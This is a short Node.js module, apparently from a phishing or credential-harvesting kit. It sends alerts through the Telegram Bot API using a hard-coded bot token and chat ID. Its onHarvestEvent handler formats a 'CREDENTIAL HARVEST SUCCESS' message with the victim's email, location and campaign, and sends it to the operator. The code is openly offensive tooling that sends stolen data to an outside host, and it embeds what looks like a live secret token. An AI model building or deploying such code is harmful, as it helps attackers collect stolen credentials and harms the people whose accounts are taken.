const axios = require('axios');

// --- TELEGRAM CONFIG ---
const TELEGRAM_TOKEN = '8486086452:AAFB2NUlC4Mc58tT0AXpX8FM7dMFMm-26pM';
const CHAT_ID = '8486086452';

/**
 * Sends a real-time alert to your mobile device via Telegram.
 * @param {string} message - The alert text to send.
 */
async function sendTelegramAlert(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('[+] Telegram alert dispatched.');
    } catch (error) {
        console.error('[!] Failed to send Telegram alert:', error.message);
    }
}

// --- HARVEST LOGIC EXAMPLE ---
// Replace this with your actual harvest event logic
function onHarvestEvent(harvestedData) {
    if (harvestedData.type === 'Credential_Harvest') {
        const alertBody = `
🚨 *CREDENTIAL HARVEST SUCCESS* 🚨
---------------------------
*Target:* ${harvestedData.email}
*Location:* ${harvestedData.geo}
*Timestamp:* ${new Date().toLocaleTimeString()}
*Vector:* ${harvestedData.source_campaign}
---------------------------
Check the dashboard for details.
        `;
        sendTelegramAlert(alertBody);
    }
}

module.exports = { sendTelegramAlert, onHarvestEvent };